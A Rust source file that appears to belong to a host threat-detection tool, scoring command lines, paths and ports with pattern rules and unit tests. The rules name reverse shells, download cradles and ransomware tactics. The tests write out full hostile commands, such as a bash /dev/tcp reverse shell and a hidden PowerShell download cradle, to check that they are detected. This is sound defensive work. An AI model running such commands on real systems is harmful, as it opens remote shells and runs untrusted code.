//! Platform independent heuristics for command lines, paths and ports.
//!
//! Every rule returns a human readable reason so verdicts are explainable.

use crate::model::Severity;

/// A matched indicator: why, and how bad.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Indicator {
    pub severity: Severity,
    pub reason: String,
}

fn ind(severity: Severity, reason: &str) -> Indicator {
    Indicator { severity, reason: reason.to_string() }
}

/// Patterns that strongly suggest malicious command execution. Matched
/// case-insensitively against the full command text.
const COMMAND_RULES: &[(&[&str], Severity, &str)] = &[
    // --- Unix download-and-execute / reverse shells
    (&["curl ", "| sh"], Severity::High, "downloads and pipes a script into sh"),
    (&["curl ", "|sh"], Severity::High, "downloads and pipes a script into sh"),
    (&["curl ", "| bash"], Severity::High, "downloads and pipes a script into bash"),
    (&["curl ", "|bash"], Severity::High, "downloads and pipes a script into bash"),
    (&["wget ", "| sh"], Severity::High, "downloads and pipes a script into sh"),
    (&["wget ", "|sh"], Severity::High, "downloads and pipes a script into sh"),
    (&["wget ", "| bash"], Severity::High, "downloads and pipes a script into bash"),
    (&["wget ", "|bash"], Severity::High, "downloads and pipes a script into bash"),
    (&["wget ", "-o-"], Severity::Medium, "streams a download to stdout"),
    (&["/dev/tcp/"], Severity::Critical, "bash /dev/tcp network redirection (reverse shell)"),
    (&["/dev/udp/"], Severity::Critical, "bash /dev/udp network redirection (reverse shell)"),
    (&["nc ", " -e "], Severity::Critical, "netcat executing a program (bind/reverse shell)"),
    (&["ncat ", " -e "], Severity::Critical, "ncat executing a program (bind/reverse shell)"),
    (&["ncat ", "--exec"], Severity::Critical, "ncat executing a program (bind/reverse shell)"),
    (&["mkfifo", "nc "], Severity::Critical, "named-pipe netcat shell"),
    (&["socat ", "exec:"], Severity::Critical, "socat spawning a program over the network"),
    (&["base64 -d"], Severity::High, "decodes base64 payload at runtime"),
    (&["base64 --decode"], Severity::High, "decodes base64 payload at runtime"),
    (&["python", "-c", "socket"], Severity::Critical, "inline python socket code (reverse shell)"),
    (&["perl", "-e", "socket"], Severity::Critical, "inline perl socket code (reverse shell)"),
    (&["php -r", "fsockopen"], Severity::Critical, "inline php socket code (reverse shell)"),
    (&["openssl s_client", "-connect"], Severity::High, "openssl used as an encrypted shell channel"),
    (&["chmod +x /tmp/"], Severity::High, "makes a file in /tmp executable"),
    (&["chmod 777 /tmp/"], Severity::High, "makes a file in /tmp world-writable/executable"),
    (&["/dev/shm/"], Severity::High, "executes from /dev/shm (tmpfs, common malware staging)"),
    (&["xmrig"], Severity::Critical, "XMRig cryptominer"),
    (&["stratum+tcp"], Severity::Critical, "cryptominer pool protocol"),
    (&["ld_preload="], Severity::High, "sets LD_PRELOAD"),
    (&["history -c"], Severity::Medium, "clears shell history (anti-forensics)"),
    (&["unset histfile"], Severity::Medium, "disables shell history (anti-forensics)"),
    // --- Windows LOLBins / PowerShell tradecraft
    (&["-encodedcommand"], Severity::High, "PowerShell encoded command"),
    (&["powershell", " -enc "], Severity::High, "PowerShell encoded command"),
    (&["powershell", " -e "], Severity::Medium, "PowerShell possibly encoded command"),
    (&["iex", "downloadstring"], Severity::Critical, "PowerShell download cradle (IEX DownloadString)"),
    (&["invoke-expression", "downloadstring"], Severity::Critical, "PowerShell download cradle"),
    (&["downloadfile("], Severity::High, "PowerShell WebClient.DownloadFile"),
    (&["invoke-webrequest"], Severity::Medium, "PowerShell web download"),
    (&["frombase64string"], Severity::High, "decodes base64 payload at runtime"),
    (&["-windowstyle hidden"], Severity::Medium, "hidden PowerShell window"),
    (&["-w hidden"], Severity::Medium, "hidden PowerShell window"),
    (&["-nop", "-w", "hidden"], Severity::High, "hidden, profile-less PowerShell"),
    // Routine for admin tooling (IDEs, agents, Intune); only meaningful when
    // combined with the hidden/encoded/download rules above and below.
    (&["bypass", "-executionpolicy"], Severity::Low, "bypasses PowerShell execution policy"),
    (&["-ep bypass"], Severity::Low, "bypasses PowerShell execution policy"),
    (&["mshta", "http"], Severity::Critical, "mshta executing remote HTA"),
    (&["mshta", "javascript:"], Severity::Critical, "mshta executing inline script"),
    (&["mshta", "vbscript:"], Severity::Critical, "mshta executing inline script"),
    (&["rundll32", "javascript:"], Severity::Critical, "rundll32 executing inline script"),
    (&["regsvr32", "/i:http"], Severity::Critical, "regsvr32 Squiblydoo remote scriptlet"),
    (&["regsvr32", "scrobj.dll"], Severity::Critical, "regsvr32 scriptlet execution"),
    (&["certutil", "-urlcache"], Severity::High, "certutil used as a downloader"),
    (&["certutil", "-decode"], Severity::High, "certutil decoding a payload"),
    (&["bitsadmin", "/transfer"], Severity::High, "bitsadmin used as a downloader"),
    (&["wscript", "\\appdata\\"], Severity::High, "script host running from AppData"),
    (&["cscript", "\\appdata\\"], Severity::High, "script host running from AppData"),
    (&["wscript", "\\temp\\"], Severity::High, "script host running from a temp directory"),
    (&["cscript", "\\temp\\"], Severity::High, "script host running from a temp directory"),
    (&["cmd", "/c", "echo", "|"], Severity::Medium, "chained cmd.exe pipeline"),
    (&["vssadmin", "delete shadows"], Severity::Critical, "deletes volume shadow copies (ransomware)"),
    (&["wmic", "shadowcopy delete"], Severity::Critical, "deletes volume shadow copies (ransomware)"),
    (&["bcdedit", "recoveryenabled no"], Severity::Critical, "disables Windows recovery (ransomware)"),
    (&["wevtutil", " cl "], Severity::High, "clears Windows event logs"),
    (&["add-mppreference", "-exclusionpath"], Severity::High, "adds a Defender exclusion"),
    (&["set-mppreference", "-disablerealtimemonitoring"], Severity::Critical, "disables Defender real-time protection"),
];

/// Writable / staging directories commonly abused to drop payloads.
const UNIX_STAGING_DIRS: &[&str] = &["/tmp/", "/var/tmp/", "/dev/shm/", "/run/shm/", "/dev/mqueue/"];

const WINDOWS_STAGING_DIRS: &[&str] = &[
    "\\appdata\\local\\temp\\",
    "\\windows\\temp\\",
    "\\users\\public\\",
    "\\$recycle.bin\\",
    "\\programdata\\temp\\",
    "\\downloads\\",
    "\\perflogs\\",
    "\\windows\\debug\\",
    "\\windows\\tasks\\",
    "\\windows\\tracing\\",
];

const WINDOWS_USER_DIRS: &[&str] = &["\\appdata\\roaming\\", "\\appdata\\local\\", "\\desktop\\", "\\documents\\"];

/// Interpreters / shells. A shell owning a network socket is the textbook
/// signature of a bind or reverse shell.
pub const SHELL_NAMES: &[&str] = &[
    "sh",
    "bash",
    "dash",
    "zsh",
    "ksh",
    "csh",
    "tcsh",
    "fish",
    "busybox",
    "ash",
    "cmd.exe",
    "powershell.exe",
    "pwsh.exe",
    "pwsh",
    "wscript.exe",
    "cscript.exe",
    "mshta.exe",
];

/// Network tools that should rarely be long-running listeners.
pub const NETCAT_NAMES: &[&str] = &["nc", "ncat", "netcat", "nc.traditional", "nc.openbsd", "socat", "nc.exe", "ncat.exe"];

/// Remote ports associated with C2 frameworks, RATs, IRC botnets and miners.
pub fn suspicious_remote_port(port: u16) -> Option<&'static str> {
    Some(match port {
        1337 | 31337 => "elite/backdoor port",
        4444 | 4445 => "Metasploit default handler port",
        5555 => "common RAT / ADB port",
        6666 | 6667 | 6668 | 6669 | 6697 => "IRC (botnet C2)",
        1080 => "SOCKS proxy",
        3333 | 14444 | 45700 => "cryptominer pool port",
        50050 => "Cobalt Strike team server",
        2222 => "alternate SSH backdoor",
        8888 => "common C2 / Jupyter port",
        9001 | 9030 | 9050 | 9051 | 9150 => "Tor relay/SOCKS port",
        12345 | 54321 | 65535 => "classic trojan port",
        _ => return None,
    })
}

/// Listening ports that are suspicious in their own right. Kept deliberately
/// narrow: generic "trojan" ports such as 12345/54321 are used by legitimate
/// software (Docker Desktop, vendor update services).
pub fn suspicious_listen_port(port: u16) -> Option<&'static str> {
    Some(match port {
        1337 | 31337 => "elite/backdoor port",
        4444 | 4445 => "Metasploit default port",
        _ => return None,
    })
}

pub fn analyze_command(cmd: &str) -> Vec<Indicator> {
    let lower = cmd.to_ascii_lowercase();
    let mut out: Vec<Indicator> = Vec::new();
    for (needles, sev, reason) in COMMAND_RULES {
        if needles.iter().all(|n| lower.contains(n)) && !out.iter().any(|i| i.reason == *reason) {
            out.push(ind(*sev, reason));
        }
    }
    // Only meaningful for interpreters: Chromium/Electron pass long base64
    // blobs (e.g. --gpu-preferences) on every launch.
    if has_long_base64_blob(cmd) && !out.iter().any(|i| i.reason.contains("base64")) && invokes_interpreter(&lower) {
        out.push(ind(Severity::Medium, "interpreter invoked with a long base64-like blob"));
    }
    out
}

fn invokes_interpreter(lower: &str) -> bool {
    const INTERPRETERS: &[&str] =
        &["powershell", "pwsh", "cmd.exe", "cmd /c", "mshta", "wscript", "cscript", "bash ", "sh -c", "python", "perl ", "ruby ", "php ", "node -e", "echo "];
    INTERPRETERS.iter().any(|i| lower.contains(i))
}

/// True for runs of >= 120 base64 alphabet chars, a cheap signal of embedded payloads.
pub fn has_long_base64_blob(s: &str) -> bool {
    let mut run = 0usize;
    for c in s.chars() {
        if c.is_ascii_alphanumeric() || c == '+' || c == '/' || c == '=' {
            run += 1;
            if run >= 120 {
                return true;
            }
        } else {
            run = 0;
        }
    }
    false
}

pub fn analyze_unix_path(path: &str) -> Vec<Indicator> {
    let mut out = Vec::new();
    if path.is_empty() {
        return out;
    }
    let p = path.trim();
    if UNIX_STAGING_DIRS.iter().any(|d| p.starts_with(d)) {
        out.push(ind(Severity::High, "executes from a world-writable staging directory"));
    }
    if p.starts_with("memfd:") || p.starts_with("/memfd:") {
        out.push(ind(Severity::Critical, "fileless execution from an anonymous memfd"));
    }
    let file = p.rsplit('/').next().unwrap_or(p);
    if file.starts_with('.') && file.len() > 1 {
        out.push(ind(Severity::Medium, "executable is a hidden dot-file"));
    }
    let deceptive = |seg: &str| (seg.starts_with("..") && seg.len() > 2) || (!seg.is_empty() && seg.trim().is_empty());
    if p.split('/').any(deceptive) {
        out.push(ind(Severity::High, "path contains deceptive directory names"));
    }
    out
}

pub fn analyze_windows_path(path: &str) -> Vec<Indicator> {
    let mut out = Vec::new();
    if path.is_empty() {
        return out;
    }
    let lower = path.to_ascii_lowercase().replace('/', "\\");
    if WINDOWS_STAGING_DIRS.iter().any(|d| lower.contains(d)) {
        out.push(ind(Severity::High, "runs from a temp/staging directory"));
    } else if WINDOWS_USER_DIRS.iter().any(|d| lower.contains(d)) && lower.ends_with(".exe") && !is_known_user_installed(&lower) {
        out.push(ind(Severity::Low, "runs from a user-writable profile directory"));
    }
    if lower.contains(":\\programdata\\") && lower.matches('\\').count() == 2 {
        out.push(ind(Severity::Medium, "executable dropped in the ProgramData root"));
    }
    let file = lower.rsplit('\\').next().unwrap_or(&lower);
    if file.matches('.').count() >= 2 {
        let exts = [".pdf.exe", ".doc.exe", ".docx.exe", ".jpg.exe", ".txt.exe", ".xls.exe", ".png.exe", ".pdf.scr"];
        if exts.iter().any(|e| file.ends_with(e)) {
            out.push(ind(Severity::High, "double file extension (document masquerading as executable)"));
        }
    }
    if file.ends_with(".scr") || file.ends_with(".pif") {
        out.push(ind(Severity::Medium, "uncommon executable extension"));
    }
    if path.chars().any(|c| c == '\u{202E}') {
        out.push(ind(Severity::Critical, "right-to-left override character in path"));
    }
    out
}

/// Per-user installers (Teams, Discord, VS Code, Chrome...) legitimately live
/// in AppData; avoid flagging them as a weak signal.
fn is_known_user_installed(lower: &str) -> bool {
    const KNOWN: &[&str] = &[
        "\\appdata\\local\\microsoft\\",
        "\\appdata\\local\\programs\\",
        "\\appdata\\local\\google\\",
        "\\appdata\\local\\discord\\",
        "\\appdata\\local\\slack\\",
        "\\appdata\\local\\zoom",
        "\\appdata\\roaming\\zoom\\",
        "\\appdata\\local\\mozilla",
        "\\appdata\\local\\jetbrains\\",
        "\\appdata\\roaming\\spotify\\",
        "\\appdata\\local\\spotify",
        "\\appdata\\local\\whatsapp",
        "\\appdata\\local\\packages\\",
        "\\appdata\\local\\docker",
        "\\appdata\\local\\github",
        "\\appdata\\local\\1password",
        "\\appdata\\local\\bravesoftware\\",
    ];
    KNOWN.iter().any(|k| lower.contains(k))
}

/// Highest severity across indicators, or `Info` when there are none.
pub fn max_severity(indicators: &[Indicator]) -> Severity {
    indicators.iter().map(|i| i.severity).max().unwrap_or(Severity::Info)
}

/// Optimal-string-alignment distance (Levenshtein + adjacent transposition),
/// so `scvhost` is one edit from `svchost`.
pub fn edit_distance(a: &str, b: &str) -> usize {
    let a: Vec<char> = a.chars().collect();
    let b: Vec<char> = b.chars().collect();
    let mut d = vec![vec![0usize; b.len() + 1]; a.len() + 1];
    for (i, row) in d.iter_mut().enumerate() {
        row[0] = i;
    }
    for (j, cell) in d[0].iter_mut().enumerate() {
        *cell = j;
    }
    for i in 1..=a.len() {
        for j in 1..=b.len() {
            let cost = usize::from(a[i - 1] != b[j - 1]);
            d[i][j] = (d[i - 1][j] + 1).min(d[i][j - 1] + 1).min(d[i - 1][j - 1] + cost);
            if i > 1 && j > 1 && a[i - 1] == b[j - 2] && a[i - 2] == b[j - 1] {
                d[i][j] = d[i][j].min(d[i - 2][j - 2] + 1);
            }
        }
    }
    d[a.len()][b.len()]
}

/// Extract the program from a command line, honouring simple quoting.
pub fn command_program(cmd: &str) -> String {
    let t = cmd.trim_start();
    if let Some(rest) = t.strip_prefix('"') {
        return rest.split('"').next().unwrap_or("").to_string();
    }
    // Windows paths with spaces but no quotes: cut at the first ".exe"
    let lower = t.to_ascii_lowercase();
    if let Some(idx) = lower.find(".exe") {
        if t[..idx].contains('\\') {
            return t[..idx + 4].to_string();
        }
    }
    t.split_whitespace().next().unwrap_or("").to_string()
}

pub fn file_name(path: &str) -> &str {
    path.rsplit(['/', '\\']).next().unwrap_or(path)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn detects_reverse_shells() {
        let i = analyze_command("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1");
        assert_eq!(max_severity(&i), Severity::Critical);
        let i = analyze_command("* * * * * curl -fsSL http://x.y/a.sh | sh");
        assert_eq!(max_severity(&i), Severity::High);
        let i = analyze_command("powershell -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://a')\"");
        assert_eq!(max_severity(&i), Severity::Critical);
    }

    #[test]
    fn execution_policy_bypass_alone_is_low() {
        let i = analyze_command("powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command $x");
        assert_eq!(max_severity(&i), Severity::Low);
        let i = analyze_command("powershell.exe -ExecutionPolicy Bypass -nop -w hidden -enc SQBFAFgA");
        assert!(max_severity(&i) >= Severity::High);
    }

    #[test]
    fn benign_commands_are_clean() {
        assert!(analyze_command("/usr/sbin/sshd -D").is_empty());
        assert!(analyze_command("\"C:\\Program Files\\Foo\\foo.exe\" --minimized").is_empty());
        assert!(analyze_command("run-parts --report /etc/cron.daily").is_empty());
    }

    #[test]
    fn paths() {
        assert_eq!(max_severity(&analyze_unix_path("/tmp/.x/kworker")), Severity::High);
        assert_eq!(max_severity(&analyze_unix_path("memfd:payload (deleted)")), Severity::Critical);
        assert!(analyze_unix_path("/usr/bin/python3").is_empty());
        assert_eq!(max_severity(&analyze_windows_path("C:\\Users\\a\\AppData\\Local\\Temp\\x.exe")), Severity::High);
        assert_eq!(max_severity(&analyze_windows_path("C:\\Users\\a\\Downloads\\invoice.pdf.exe")), Severity::High);
        assert!(analyze_windows_path("C:\\Windows\\System32\\svchost.exe").is_empty());
        assert!(analyze_windows_path("C:\\Users\\a\\AppData\\Local\\Programs\\Microsoft VS Code\\Code.exe").is_empty());
    }

    #[test]
    fn program_extraction() {
        assert_eq!(command_program("\"C:\\Program Files\\A B\\x.exe\" -k"), "C:\\Program Files\\A B\\x.exe");
        assert_eq!(command_program("C:\\Program Files\\A B\\x.exe -k"), "C:\\Program Files\\A B\\x.exe");
        assert_eq!(command_program("/usr/bin/foo --bar"), "/usr/bin/foo");
        assert_eq!(file_name("C:\\a\\b.exe"), "b.exe");
        assert_eq!(file_name("/a/b"), "b");
    }

    #[test]
    fn distance() {
        assert_eq!(edit_distance("svchost.exe", "scvhost.exe"), 1);
        assert_eq!(edit_distance("dashost.exe", "dllhost.exe"), 2);
        assert_eq!(edit_distance("lsass.exe", "lsas.exe"), 1);
        assert_eq!(edit_distance("abc", "abc"), 0);
    }

    #[test]
    fn base64_blob() {
        assert!(has_long_base64_blob(&"QUFB".repeat(40)));
        assert!(!has_long_base64_blob("hello world"));
        let blob = "QUFB".repeat(40);
        assert!(analyze_command(&format!("msedge.exe --type=gpu-process --gpu-preferences={blob}")).is_empty());
        assert!(!analyze_command(&format!("powershell.exe -nop -c {blob}")).is_empty());
    }
}
